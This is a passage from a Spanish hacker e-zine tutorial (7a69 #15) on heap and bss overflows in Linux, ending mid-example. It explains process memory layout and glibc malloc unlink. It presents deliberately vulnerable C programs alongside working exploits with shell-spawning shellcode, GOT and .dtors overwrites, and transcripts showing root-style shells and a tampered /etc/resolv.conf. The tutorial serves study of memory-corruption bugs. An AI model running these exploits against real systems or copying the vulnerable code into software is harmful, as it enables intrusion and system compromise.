@@ -1,0 +1,1058 @@
+|-----------------------------------------------------------------------------|
+  [ 7a69#15 ]                                                  [ 23-11-2003 ]
+ \                                                                           /
+  \-------------------------------------------------------------------------/
+   { 15 - Introduccion a los heap/bss overflow                     }{ Pluf }
+   |-----------------------------------------------------------------------|
+
+
+Indice
+======
+
+    1 - Introduccion
+    2 - Estructura de la imagen de un proceso
+    3 - Heap/Bss overflows
+    4 - Malloc based buffer overflows
+    5 - Protecciones
+    6 - Referencias
+
+
+
+1. Introduccion
+---------------
+
+Dentro de la gran ensalada de bugs de buffer overflow existe una variedad 
+interesante, los heap/bss overflows. Esta variedad de bugs esta siendo 
+explotada tan comunmente en todas sus variantes como cualquier otra, muchos 
+programadores ponen especial cuidado en el tratamiento de datos que se 
+mantienen en el stack pero descuidan otros datos que se encuentran en regiones
+de memoria igualmente propensas a sufrir ataques de buffer oveflow.
+
+Este articulo pretende servir como una referencia para este tipo de fallos 
+mostrando algunas de sus variantes y sus posibles metodos de explotacion.
+Todo lo que he expuesto en este articulo lo he echo sobre linux y se puede 
+aplicar sin muchos problemas a otros unix.
+
+
+
+2. Estructura de la imagen de un proceso
+----------------------------------------
+
+Para poder comprender la esencia de un heap/bss overflow es necesario, al igual
+que con los stack oveflows y otras tecnicas, conocer bastante bien cual es la 
+forma que tiene un programa en memoria. Asi pues, intentare explicar como es la
+imagen de un proceso en detalle.
+
+La imagen de un proceso es la imagen de un programa cargado en memoria, despues
+de ser mapeado. Suele tener una estructura especifica, determinada por el 
+formato elf (formato ejecutable usado en linux y en la gran mayoria de sistemas
+unix). Para mas informacion sobre elf echar una ojeada a su especificacion.
+
+Esta estructura esta constituida por una serie de segmentos situados en unas 
+localizaciones de memoria mas o menos ajustadas. Tendria un aspecto similar al 
+siguiente:
+
+
+
+0xffffffff	_________________________________________________
+0xbfffffff	[            	                                ]
+		[ Segmento de pila (stack)			]
+		[        ___  ___  ___  ___  ___  ___  ___  	]
+		[      \/   \/   \/   \/   \/   \/   \/   \/    ]
+		[						]
+		[ - - - - - - - - - - - - - - - - - - - - - - - ]
+		[						]
+		[ ( espacio libre para uso del heap y stack)    ]
+		[                                               ]
+		[ - - - - - - - - - - - - - - - - - - - - - - - ]
+		[ 						]
+		[     /\__/\__/\__/\__/\__/\__/\__/\__/\__/\    ]
+		[						]
+		[                   (heap)                      ]
+		[_______________________________________________]
+		[    BSS                                        ]
+		[- - - - - - - - - - - - - - - - - - - - - - - -]		
+		[						]
+		[ Segmento de Datos 				]
+		[                                               ]
+		[_______________________________________________]
+		[                                               ]
+		[ Segmento de Texto                      	]	
+		[                                               ]
+0x08048000	[-----------------------------------------------]
+		[ 		(espacio sin uso)               ]
+0x00000000	[_______________________________________________]
+
+
+Intentare explicar mas detalladamente cual es la funcion de cada parte:
+
+Segmento de Texto: este segmento contiene todo el codigo necesario para la 
+ejecucion del programa, esta constituido por las secciones del fichero 
+ejecutable que contienen codigo, suelen ser las primeras. El segmento de texto 
+comienza en la direccion relativa o direccion base 0x08048000. Observando con 
+gdb un simple programilla podriamos ver algo similar a esto:
+
+(gdb) maintenance info sections
+Exec file:
+    `/tmp/a.out', file type elf32-i386.
+    0x080480f4->0x08048107 at 0x000000f4: .interp ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x08048108->0x08048128 at 0x00000108: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x08048128->0x08048150 at 0x00000128: .hash ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x08048150->0x080481a0 at 0x00000150: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x080481a0->0x080481ec at 0x000001a0: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x080481ec->0x080481f6 at 0x000001ec: .gnu.version ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x080481f8->0x08048218 at 0x000001f8: .gnu.version_r ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x08048218->0x08048220 at 0x00000218: .rel.dyn ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x08048220->0x08048230 at 0x00000220: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x08048230->0x08048247 at 0x00000230: .init ALLOC LOAD READONLY CODE HAS_CONTENTS
+    0x08048248->0x08048278 at 0x00000248: .plt ALLOC LOAD READONLY CODE HAS_CONTENTS
+    0x08048280->0x08048420 at 0x00000280: .text ALLOC LOAD READONLY CODE HAS_CONTENTS
+    0x08048420->0x0804843b at 0x00000420: .fini ALLOC LOAD READONLY CODE HAS_CONTENTS
+    0x0804843c->0x0804844a at 0x0000043c: .rodata ALLOC LOAD READONLY DATA HAS_CONTENTS
+    ...
+    ...
+
+estas primeras secciones constituirian el segmento de codigo en memoria.
+
+Segmento de datos: este segmento contiene todos aquellos valores del programa 
+que estan inicializados, esto es, las variables estaticas y variables globales 
+que son asignadas en el codigo, sus valores son conocidos en tiempo de 
+compilacion. 
+El compilador calculara el espacio aproximado que se necesita para ellos en el 
+segmento de datos. Crece en sentido normal de direcciones, de direcciones de 
+memoria bajas a altas. 
+
+Usando de nuevo gdb, podriamos ver las secciones que van a constituir el 
+segmento de datos en memoria:
+
+(gdb) maintenance info sections
+Exec file:
+    ....
+    ....
+    0x0804944c->0x08049458 at 0x0000044c: .data ALLOC LOAD DATA HAS_CONTENTS
+    0x08049458->0x0804945c at 0x00000458: .eh_frame ALLOC LOAD DATA HAS_CONTENTS
+    0x0804945c->0x08049524 at 0x0000045c: .dynamic ALLOC LOAD DATA HAS_CONTENTS
+    0x08049524->0x0804952c at 0x00000524: .ctors ALLOC LOAD DATA HAS_CONTENTS
+    0x0804952c->0x08049534 at 0x0000052c: .dtors ALLOC LOAD DATA HAS_CONTENTS
+    0x08049534->0x08049538 at 0x00000534: .jcr ALLOC LOAD DATA HAS_CONTENTS
+    0x08049538->0x08049550 at 0x00000538: .got ALLOC LOAD DATA HAS_CONTENTS
+    0x08049550->0x08049554 at 0x00000550: .bss ALLOC
+    ...
+    ....
+
+
+Dentro del segmento de datos hay una seccion muy importante para nosotros que 
+se llama seccion bss. Esta seccion contiene aquellos valores no inicializados ,
+es decir, las variables estaticas y variables globales que no tienen asignados 
+valores iniciales. Cuando se trata del fichero ejecutable la seccion .bss no 
+contiene datos y suele estar rellena de ceros, solo se sabe el tamaño que 
+tendra en memoria una vez cargado el programa.
+Constituye la parte final del segmento de datos y esta justo detras del heap.
+Al igual que el segmento de datos crece en el sentido normal, de direcciones de
+memoria bajas a altas.
+
+Segmento de pila: en el segmento de pila hay dos regiones separadas y muy 
+importantes:
+
+Primero tenemos el  "heap", una region de memoria que es inicializada 
+dinamicamente por el programa. Esta seccion se encuentra justo despues de la 
+seccion bss.
+Esta region es la utilizada por malloc() para inicializar memoria dinamicamente
+en tiempo de ejecucion, en ella se econtraran los llamados chunks de memoria 
+que veremos mas adelante. 
+
+El heap crece en sentido normal, de direcciones de memoria bajas a altas, por 
+lo que va a crecer hacia el stack
+
+Posteriormente se encuentra el stack en si mismo, que contiene todas aquellas 
+variables de ambito local, no staticas, tanto inicializadas como no 
+inicializadas, en el caso de los datos dinamicos, solo se encuentra en la pila 
+el puntero que contiene la direccion de la region de memoria reservada (en el 
+heap) devuelta por una llamada a malloc().
+
+La direccion inicial del stack es la direccion mas alta del segmento por lo que
+crece en sentido inverso, de direcciones de memoria altas a bajas.
+Esto hace que crezca hacia el heap.
+
+Al igual que la forma en que crece el stack influye en un stack overflow, la 
+forma en que crece el heap influira en un posible heap overflow, asi pues el 
+orden de las variables en el codigo tendra gran influencia en la aparicion de 
+un posible ataque.
+
+Entre ambas regiones de memoria suele haber un espacio de memoria no usado que
+utilizaran en su proceso normal de crecimiento.
+
+
+
+3. heap/bss overflows
+---------------------
+
+Cuando un buffer overflow ocurre en las regiones de memoria heap o bss se le
+denomina heap/bss buffer overflow. La explotacion de este tipo de bugs es 
+sencilla solo que deben darse una serie de circunstancias para que sea posible.
+
+Este trozo de codigo contiene un simple heap buffer overflow que seguro os 
+aclara de que va esto:
+
+int
+main(int argc, char **argv)
+{
+	static char buf1[10], buf2[10];
+	memset(buf2, 'A', 10);
+	memset(buf1, '-', 10+2);
+	printf("Buf2[%s]\n", buf2);
+	return (0);
+}
+
+aragorn:~$ ./a.out
+Buf2[--AAAAAAAA]
+
+Como podeis observar, no se respetan los limites del segundo buffer y se 
+sobreescriben sus primeros dos bytes con los datos del primer buffer.
+
+En los stack overflows, la meta principal es la de modificar la direccion de
+retorno de la funcion que contiene el buffer que sera explotado, a fin de 
+modificar el flujo de ejecucion del programa, ya sea hacia un shellcode o hacia
+otro lado (depende de la tecnica usada).
+
+En un heap/bss overflow la situacion es distinta y para modificar el flujo de
+ejecucion del programa tendremos que usar otros metodos, la mayoria faciles de 
+implementar.
+
+Ahora que sabemos que este tipo de bugs no tienen mucho misterio vamos a ver
+unos ejemplos de programas vulnerables y sus correspondientes exploits, 
+usaremos uno u otro metodo de explotacion dependiendo de lo que nos permita 
+hacer el programa.
+
+
+Ejemplo [0x1]
+-------------
+
+/* ex1: bss overflow */
+void
+func(const char *msg)
+{
+        printf("[%s]\n",msg);
+}
+
+int
+main(int argc, char *argv[])
+{
+        static char buf[256];
+        static void (*p)(const char*);
+
+        p = (void*)func;		/* A */
+        strcpy(buf, argv[1]);		/* B */
+
+        p(argv[2]);
+        exit(1);
+}
+
+Como podeis ver, tenemos un buffer y un puntero a funcion, ambos estaticos, 
+estaran almacenados en la region bss. En "A", el puntero contiene la direccion
+de la funcion func, si en "B", introducimos un argv[1] de tamaño superior a buf
+podremos modificar el valor de p y apuntar donde queramos.
+
+Como posteriormente se usara p para apuntar a la funcion func() con argv[2] 
+como argumento, podriamos modificarla para que tenga la direccion del buffer 
+buf, el cual estara relleno con una pequeña y simple shellcode.
+
+Un exploit y shellcode validos serian:
+
+/*
+ * exp1.c
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BUFSIZE 256
+#define NOP 0x90
+#define BUFADDR 0x08049620
+#define PROG "./ex1"
+
+
+/*
+ * shellcode que escribira la string "eviltext" en un fichero llamado "vulfile"
+ */
+char sc[]=
+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x1f\x5e\x8d\x1e\x88\x56\x07\xb0\x05"
+"\x66\xb9\x02\x0c\xcd\x80\x8d\x4b\x07\x89\xc3\xb0\x04\xb2\x0a\xcd\x80\xb0"
+"\x01\xb3\x0a\xcd\x80\xe8\xdc\xff\xff\xffvulfile8eviltext\n";
+
+int
+main(int argc, char **argv)
+{
+        char buf[BUFSIZE+4+1];
+
+        memset(buf, 'A', BUFSIZE);
+        memset(buf, NOP, 10);
+        memcpy(buf+10, sc, strlen(sc));
+        buf[BUFSIZE+4+1] = '\0';
+        buf[BUFSIZE] = (BUFADDR & 0x000000ff);
+        buf[BUFSIZE+1] = (BUFADDR & 0x0000ff00) >> 8;
+        buf[BUFSIZE+2] = (BUFADDR & 0x00ff0000) >> 16;
+        buf[BUFSIZE+3] = (BUFADDR & 0x0ff00000) >> 24;
+
+        execl(PROG, PROG, buf, "as", NULL);
+}
+
+Vamos a probar:
+
+aragorn:~$ touch vulfile
+aragorn:~$ ./exp1
+aragorn:~$ cat vulfile
+eviltext
+aragorn:~$
+
+parece que rula :)
+
+
+Ejemplo [0x2]
+-------------
+
+/*
+ * ex2.c: heap overflow
+ */
+int main(int argc, char **argv)
+{
+        char *p1 = (char*)malloc(24), *p2 = (char*)malloc(12);
+        int fd;
+
+        strcpy(p2, "/tmp/vulfile");
+        gets(p1);
+        fd=open(p2,O_WRONLY|O_APPEND);
+        write(fd,p1,strlen(p1));
+        return (0);
+}
+
+En este ejemplo se podria introducir un buffer lo suficientemente grande como 
+para modificar el contenido de p2 y asi cambiar el nombre del fichero.
+
+aragorn:~$ touch falsofichero
+aragorn:~$ ./ex2 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAfalsofichero
+aragorn:~$ cat falsofichero
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAfalsoficheroaragorn:/tmp#
+
+Suponiendo que queremos aprovecharnos de este fallo parar añadir una entrada en
+el fichero /etc/resolv.conf, se podria hacer lo siguiente.
+
+preparamos el string adecuado, con el comentarito, esta claro que esto es un 
+ejemplo practico y no tiene nada que ver con la realidad :)
+
+aragorn:~$ ./ex2
+nameserver 62.37.228.20 #       /etc/resolv.conf
+aragorn:~$ cat /etc/resolv.conf
+search bind, file
+nameserver 62.37.228.20
+nameserver 62.37.225.58
+nameserver 62.37.228.20 #       /etc/resolv.confaragorn:/tmp#
+
+parece que ha funcionado, hemos conseguido sobrescribir el nombre de fichero 
+orignal por /etc/resolv.conf y añadirle la cadena.
+
+
+Ejemplo [0x3]
+-------------
+
+/* 
+ * ex3.c: bss overflow
+ */
+int
+main(int argc, char **argv[])
+{
+        static char buf[12], *ptr;
+        ptr = (char*)malloc(0);
+
+        strcpy(buf, argv[1]);
+        strcpy(ptr, argv[2]);
+        exit(1);
+}
+
+Como poedeis ver, este ejemplo contiene otro bss overflow, tenemos un buffer y 
+un puntero ambos almacenados en la region bss. Un argv[1] de 12+4 bytes 
+modificaria el valor del puntero, permitiendonos, posteriormente, escribir el 
+valor de argv[2] en cualquier region de memoria.
+
+Para poder explotar este ejemplo nos vamos a aprovechar de una seccion llamada 
+dtors, destructores, creada unicamente por el compilador gcc, que contiene las 
+direcciones de aquellas rutinas que deberan ser llamadas despues de que 
+finalize la ejecucion de main. 
+Una vez que el programa es cargado en memoria y el enlazador dinamico pasa el 
+control del programa a la funcion inicial __init(), se preparan los argumentos 
+para la siguiente funcion, la __libc_start_main(), esta funcion llamara a las 
+funciones constructoras, saltara a main para que se ejecute el programa y 
+posteriormente llamara a las funciones destructoras.
+
+Si modificamos ptr para que apunte a la seccion .dtors y metemos en ella la 
+direccion de un shellcode, introducido anteriormente, conseguiriamos modificar 
+el flujo de ejecucion del programa saltando a nuestra shellcode tras el exit() 
+en main.
+
+El shellcode se podria introducir por argv[3].
+
+Un posible exploit podria ser:
+
+/*
+ * exp3.c
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define DTORS 0x080495c4
+#define BUFSIZE 16
+#define PROG "./ex3"
+
+/* shellcode de 25 bytes */
+char shellcode[] =
+"\x31\xdb\x31\xc9\xf7\xe3\xb0\x46\xcd\x80\x53\x68\x6e"
+"\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"
+"\xe1\xb0\x0b\xcd\x80";
+
+unsigned long get_esp()
+{
+        __asm__("movl %esp,%eax");
+}
+
+int
+main(int argc, char **argv)
+{
+        register int i;
+        unsigned long addr =  get_esp();
+        char badbuf[BUFSIZE+1];
+        char dtorsentry[12+1];
+        char sc[strlen(code)+1];
+
+        if (argc>1) addr +=atoi(argv[1]);
+
+        memset(badbuf, 'A', BUFSIZE-4);
+        *(int*)&badbuf[BUFSIZE-4] = DTORS;
+        badbuf[BUFSIZE+1] = '\0';
+
+        memcpy(sc, code, strlen(code));
+        sc[strlen(code)+1] =  '\0';
+
+        /* esto modifica la seccion dtors añadiendo una nueva entrada,
+         * la direccion a nuestro shellcode
+         */
+        *(int*)&dtorsentry[0] = 0xffffffff;
+        *(int*)&dtorsentry[4] = addr;
+        *(int*)&dtorsentry[8] = 0x00000000;
+        dtorsentry[13] = '\0';
+
+        printf("Dtors addr [0x%x]\n", DTORS);
+        printf("Shellcode addr [0x%x]\n", addr);
+        printf("Nueva entrada en dtors:\n");
+        for(i=0;i<=8;i+=4)
+                printf("        0x%x\n",*(int*)&dtorsentry[i]);
+
+        execl(PROG, PROG, badbuf, dtorsentry, sc, NULL);
+}
+
+Probando y probando offsets hasta que funcione:
+
+aragorn:~$ ./getoffset
+...
+...
+offset [415]
+Dtors addr [0x80495c4]
+Shellcode addr [0xbffffc27]
+Nueva entrada en dtors:
+        0xffffffff
+        0xbffffc27
+        0x0
+sh-2.05a$
+
+
+Ejemplo [0x4]
+-------------
+
+/* 
+ * ex4.c: bss overflow 
+*/
+int
+main(int argc, char **argv)
+{
+        static char buf[8], *p;
+        unsigned int len = strlen(argv[1]);
+        p = (char*)malloc(10);
+
+        system("sleep 2");
+        if (len > 0 && len <= 12) {
+                strcpy(buf, argv[1]);
+                strncpy(p, buf, 4);
+                printf(argv[2]);
+        }
+        exit(1);
+}
+
+En este caso tenemos algunas restricciones, solo podemos introducir 12 bytes 
+maximo en argv[1], lo que evita que podamos meter un shellcode en buf al que 
+saltar. 
+Se escriben 4 bytes en p, una solucion seria: introducimos 12 bytes, los 4 
+primeros con la direccion de la funcion system() y los 4 ultimos con la 
+direccion de la entrada de printf en el GOT, asi p apuntara a esta entrada y  
+cuando se escriba en el, se modificara el valor inicial para que apunte a 
+system().
+Cuando se llame a printf lo que se hara realmente sera llamar a system() con el
+argumento argv[2].
+
+Un exploit valido para este ejemplo seria:
+
+/*
+ * exp4.c
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define SYSTEMADDR 0x4005b530
+#define GOT_PRINTF_ADDR 0x08049714
+#define PROG "./ex4"
+
+int
+main(int argc, char **argv)
+{
+        char badbuf[12];
+        register int i;
+
+        memset(badbuf, 'A', 12);
+        *(int*)&badbuf[0] = SYSTEMADDR;
+        *(int*)&badbuf[8] = GOT_PRINTF_ADDR; 
+        badbuf[11+1] = '\0'; /* 0x8049714 + byte nulo = pfff jeje */
+        printf("[%d]\n", strlen(badbuf));
+
+        for(i=0;i<12;i+=4)
+                printf("[0x%x]\n", *(int*)&badbuf[i]);
+
+        printf(">[%s]\n",argv[1]);
+
+        execl(PROG, PROG, badbuf, argv[1], NULL);
+}
+
+aragorn:~$ ./ex4 AAAA BBBBBBBB
+(sleep2)
+BBBBBBBBaragorn:~$
+
+aragorn:~$ ./ex4 AAAAAAAAA BBBBBBBB
+(sleep2)
+Segmentation fault (core dumped)
+aragorn:~$
+
+pasando por ejemplo el comando "ls":
+
+aragorn:~$ ./exp4 "ls -a"
+[12]
+[0x4005b530]
+[0x41414141]
+[0x8049714]
+>[ls -a]
+(sleep2)
+.  ..  a.c  a.out  core  exp4  file  vul4  vulfile  ex4
+aragorn:~$
+
+
+
+4. Malloc based buffer overflows (implementacion GNU libc)
+
+Como hemos visto anteriormente, cuando se dan las circunstancias adecuadas un 
+heap overflow nos brinda la posibilidad de modificar el flujo de ejecucion de 
+un programa.  Gracias a la implementacion malloc de la GNU libc, usada en linux
+, esta posibilidad se puede ampliar considerablemente, permitiendonos explotar 
+un programa en las condiciones mas extremas. 
+
+Este tipo de bugs es conocido como malloc based buffer overflows y su 
+explotacion es relativamente mas compleja que los ejemplos anteriores.
+
+Es necesario que conozcamos algunos aspectos de la implementacion de malloc 
+pero no pretendo darle un repaso completo, unicamente nos centraremos en lo 
+minimo requerido para construir un exploit y comprender como funciona.
+Para aquellos que quieran profundizar en el tema les recomiendo los articulos
+[1] y [2] de las referencias.
+
+Cuando utlizamos la funcion malloc() para reservar una region de memoria 
+determinada se utiliza el espacio del heap. Esta region de memoria en el heap 
+se conoce como "chunk" y esta formada por dos partes bien diferenciadas: la 
+cabecera que contiene la informacion necesaria para administrar todos los 
+chunks, y la zona de datos, que es la que realmente usamos nosotros.
+
+Un chunk se puede dar en dos contextos: cuando esta inicializado y por tanto 
+esta siendo usado por malloc y cuando esta libre y a la espera de fusionarse 
+con otros chunks adyacentes para constituir regiones sin utilizar:
+
+	
+	chunk inicializado			chunk libre
+
+       (chunk previo )				(chunk previo)
+
+	.	    .				.		 .		
+inicio	:___________:				:________________:	
+Chunk->	[	    ]  \			[		 ] \
+	[ prev_size ]	) 4 bytes		[   prev_size	 ]  ) 4 bytes
+	[___________]  /			[________________] / 
+	[           ]  \			[		 ] \
+	[   size    ]	) 4 bytes		[     size	 ]  ) 4 bytes
+	[___________]  /			[________________] / 
+	[	    ]  \			[    		 ] \
+	[	    ]   |			[  puntero fd    ]  ) 4 bytes
+	[   datos   ]	|			[________________] /
+fin	[   	    ]	|			[ 		 ] \
+chunk->	[___________]  /			[  puntero bk	 ]  ) 4 bytes
+ 	:	    :				[________________] /
+	 					[	  	 ]
+      (siguiente chunk)				[ datos antiguos ]
+						[ ...		 ]
+						[________________]
+						:		 :
+
+						(siguiente chunk)
+
+Esta es la estructura de un chunk:
+
+struct malloc_chunk {
+
+  INTERNAL_SIZE_T      prev_size;
+  INTERNAL_SIZE_T      size;      
+
+  struct malloc_chunk* fd;     
+  struct malloc_chunk* bk;
+};
+
+Ahora, vamos a ver cual es la funcion de cada uno de estos elementos y cuando 
+es utilizado por malloc:
+
+prev_size -> si el chunk previo esta sin usar (free) este campo contiene su 
+tamaño, en caso contrario, prev_size forma parte de los datos del chunk previo.
+
+size -> indica el tamaño real del chunk, contiene una serie de flags de 
+informacion en los bits menos significativos, destaca el flag PREV_INUSE que se
+utiliza para saber el estado del chunk previo: si esta activado, el chunk esta 
+siendo usado en caso contrario, el chunk esta libre.
+
+puntero fd (forward) y puntero bk (backward) -> como los chunks liberados se 
+encuentran en una lista doblemente enlazada estos punteros indican el elemento 
+siguiente y previo respectivamente. Solo estan presentes en los chunk libres y 
+se situan justo despues del elemento size, suelen ocupar los primeros 8 bytes 
+de la parte de datos.
+
+datos -> aqui estaran nuestros datos :)
+
+El tamaño de memoria que nosotros pedimos a malloc no se suele corresponder con
+la realidad, malloc reserva memoria en multiplos de 8bytes por lo que casi 
+siempre se suele realizar un padding hasta el siguiente multiplo. Asi un malloc
+(20) creara un chunk con 24 bytes en la region de datos. Si tenemos dos chunks
+inicializados el elemento prev_size del segundo chunk siempre formara parte de 
+la zona de datos del primero.
+
+Esto se realiza con una macro:
+
+#define request2size(req)                                         \
+  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)  ?             \
+   MINSIZE :                                                      \
+   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)
+
+Centrandonos en lo que a nosotros nos interesa, si tenemos dos chunks 
+inicializados y se produce un heap overflow en el primero, podriamos 
+sobrescribir elementos de la cabecera del segundo como por ejemplo size, 
+prev_size, etc. 
+Y para que nos puede servir esto? la respuesta nos la da la funcion free()
+
+Cuando queremos liberar una region de memoria previamente reservada con 
+malloc(), usamos la funcion free(). Esta funcion, debido a su forma de operar, 
+es la que nos va a permitir aprovechar un heap oveflow para modificar el flujo 
+del programa. Al llamar a free(), esta, intenta comprobar si el chunk previo y 
+el siguiente al que queremos liberar estan a su vez libres, si alguno de los dos
+lo esta, iniciara el proceso de fusion de ambos, introduciendo el nuevo chunk 
+libre resultante en la lista doblemente enlazada de chunks sin uso.
+
+Cuando se comprueba el chunk previo (consolidate backward) se realiza lo 
+siguiente:
+
+ /* consolidate backward */
+      if (!prev_inuse(p)) {
+        prevsize = p->prev_size;
+        size += prevsize;
+        p = chunk_at_offset(p, -((long) prevsize));
+        unlink(p, bck, fwd);
+      }
+
+primero se comprueba que el chunk este libre, si lo esta, comienza el proceso de
+fusion: se obtiene su size del campo prev_size del chunk actual, para poder 
+saber donde empieza su cabecera, y despues se llama a la macro unlink()
+
+Cuando se comprueba el chunk siguiente (consolidate foreward) se realiza algo 
+similar:
+	
+	...
+ 	nextchunk = chunk_at_offset(p, size);
+	nextsize = chunksize(nextchunk);
+	...
+
+      if (nextchunk != av->top) {
+        /* get and clear inuse bit */
+        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
+
+        /* consolidate forward */
+        if (!nextinuse) {
+          unlink(nextchunk, bck, fwd);
+          size += nextsize;
+        } else
+          clear_inuse_bit_at_offset(nextchunk, 0);
+
+se comprueba que este libre, si lo esta, se realizara el proceso de fusion 
+mediante la macro unlink().
+
+Aqui lo fundamental es la macro unlink(), esta macro se encarga de añadir el 
+chunk libre resultante de la fusion, en la lista doblemente enlazada de chunks 
+libres, se le pasan un puntero al chunk libre (ya sea el previo o siguiente al 
+que pasamos a free()) , y dos punteros a estructura chunk:
+
+#define unlink(P, BK, FD) {                                            \
+  FD = P->fd;                                                          \
+  BK = P->bk;                                                          \
+  FD->bk = BK;                                                         \
+  BK->fd = FD;                                                         \
+}
+
+si se mira detenidamente esta macro, nos damos cuenta de que si exisitiera la 
+posibilidad de modificar la cabecera de un segundo chunk, ya sea el previo o el
+siguiente al que queremos liberar, seriamos capaces de escribir 4 bytes en
+cualquier direccion de memoria. Esa posibilidad nos la brinda el heap overflow.
+
+Ahora que tenemos unos conocimientos minimos sobre lo que ocurre en el heap 
+cuando usamos la funcion malloc() podemos empezar a ver algunos ejemplos de 
+programas vulnerables.
+En todos ellos voy a usar el metodo unlink, podremos ver como hay diferentes 
+variantes en funcion de lo que nos permite hacer el programa.
+
+
+Ejemplo [0x5] (foreward consolidation)
+--------------------------------------
+	
+/*
+ * ex5.c
+ */
+int
+main(int argc, char **argv)
+{
+        register int i;
+        char *p1, *p2;
+        int len;
+        char buf[4];
+
+        p1 = (char*)malloc(100);
+        p2 = (char*)malloc(12);
+
+        if (strlen(argv[2]) < 100)		/* A */
+                len = strlen(argv[2]);
+        else
+                len = 99;
+
+        for(i=0;i<=4;i++)			/* B */
+                buf[i] = argv[1][i];
+
+        printf("Copiar (%d) bytes\n", len);	/* C */
+        strncpy(p1, argv[2], len);
+
+        free(p1);				/* D */	
+        free(p2);				/* E */
+        exit(0);
+}
+
+Vamos a ver detenidamente lo que ocurre en este programilla:
+
+Tenemos un chequeo de limites en "A" para que len no tenga un valor mayor de 
+100 bytes, pero en "B" podemos evadirlo mediante un simple stack oveflow, 
+modificando len con el valor que queramos a traves de argv[1]. 
+Cuando llegamos a "C", se puede producir un heap overflow sobrescribiendo datos 
+de la region de memoria apuntada por p2, esto daria lugar a un core en "D".
+
+modificar len para que tenga el valor 65
+
+aragorn:~$ ./ex5 holaA textoenelheap
+Copiar (65) bytes
+aragorn:~$
+
+si hacemos que len tenga un valor mayor que 100 tendremos un core
+
+aragorn:~$ ./ex5 holaf textoenelheap
+Copiar (102) bytes
+Segmentation fault (core dumped)
+
+Mediante el stack overflow podriamos establecer un valor de len mayor que 100, 
+lo que nos permitiria usar el heap overflow para modificar los valores de la 
+cabecera del segundo chunk. Gracias a esto y un pequeño truco que veremos 
+enseguida,podriamos hacer creer a free(p1) que el segundo chunk esta libre, este
+intentaria fusionarlo mediante unlink y nosotros tendriamos la posibilidad de 
+escribir 4 bytes en cualquier parte de la memoria.
+
+Los punteros fd y bk los podemos introducir con el valor que queramos, siempre 
+que esten situados en los primeros 8 bytes de la zona de datos.
+
+Vamos a ver un ejemplo de exploit que nos permite explotar el programa de arriba
+
+/*
+ * exp5.c
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define PROG "./ex5"
+
+#define SHELLCODEADDR 0x08049778
+#define FREEADDR 0x08049738
+
+#define TRASH 0xffffffff	
+#define FLAG 0x1		
+	
+/* shellcode de 25 bytes */
+char shellcode[] =
+"\x31\xdb\x31\xc9\xf7\xe3\xb0\x46\xcd\x80\x53\x68\x6e"
+"\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"
+"\xe1\xb0\x0b\xcd\x80";
+
+int
+main(int argc, char **argv)
+{
+        int len = atoi(argv[1]);
+        char badbuf[len+1];
+        char xequeo[6];
+        register int i;
+        char *ptr;
+        int offset = SHELLCODEADDR;
+
+        /* buf xequeo */
+        *(int*)&xequeo[0] = 0x41414141;
+        xequeo[4] = 0x71; /* sobreescribir len a 112 bytes */
+        xequeo[5] = '\0';
+
+        /* buffer malo :), primer chunk */
+        /* relleno (padding incluido) */
+        memset(badbuf,0x90, len);
+        /* saltamos 12 bytes para evitar el valor de fd */
+        badbuf[8] = '\xeb';
+        badbuf[9] = '\x0c';
+        memcpy(badbuf+30, shellcode, strlen(shellcode));   /* meter shellcode */
+        *(int*)&badbuf[(len-16)] = (TRASH & ~FLAG);        /* desactivar flag */
+        *(int*)&badbuf[(len-12)] = -4;
+        *(int*)&badbuf[(len-8)] = (FREEADDR - 12); /* fd=direcion free (GOT) */
+        *(int*)&badbuf[(len-4)] = offset +8;       /* bk=direccion shellcode */
+        *(int*)&badbuf[len] = '\0';
+
+        printf("Fake info (segundo chunk):\n");
+        for(i=16;i>0;i-=4)
+                printf("[0x%x]\n", *(int*)&badbuf[len - i]);
+
+        execl(PROG, PROG, xequeo, badbuf, NULL);
+        return (0);
+}
+
+Con el buffer xequeo modificamos len para que tenga el valor de 112.
+El buffer que copiaremos en el heap sobrescribira 12 bytes: el elemento size del
+segundo chunk y ademas introducira los elementos fd y bk. 
+
+Para hacer creer a free que el segundo chunk esta libre usaremos el truco al que
+me referia anteriormente y que consiste en modificar el elemento size para que 
+tenga un valor de -4, es decir, que apunte al elemento prev_size, el cual 
+habremos modificado para que tenga desactivado el flag PREV_INUSE.
+
+En fd tendremos un puntero a la entrada en el GOT de la funcion free, y en bk la
+direccion de nuestro shellcode en el heap. Lo que unlink va ha hacer es 
+modificar dicha entrada en el GOT por la direccion de nuestra shellcode, la 
+segunda vez que se ejecuta free obtendremos directamente una bonita shell.
+
+aragorn:~$ ./exp5 112
+Fake info (segundo chunk):
+[0xfffffffe]
+[0xfffffffc]
+[0x804972c]
+[0x8049780]
+Copiar (113) bytes
+sh-2.05a$
+
+funciona!
+
+
+Ejemplo [0x6] (backward consolidation | heap-off-by-one)
+--------------------------------------------------------
+
+/*
+ * ex6.c
+ */
+int
+main(int argc, char **argv)
+{
+        char *p1, *p2;
+        int i;
+        p1 =(char*) malloc(12);
+        p2 =(char*) malloc(100);
+
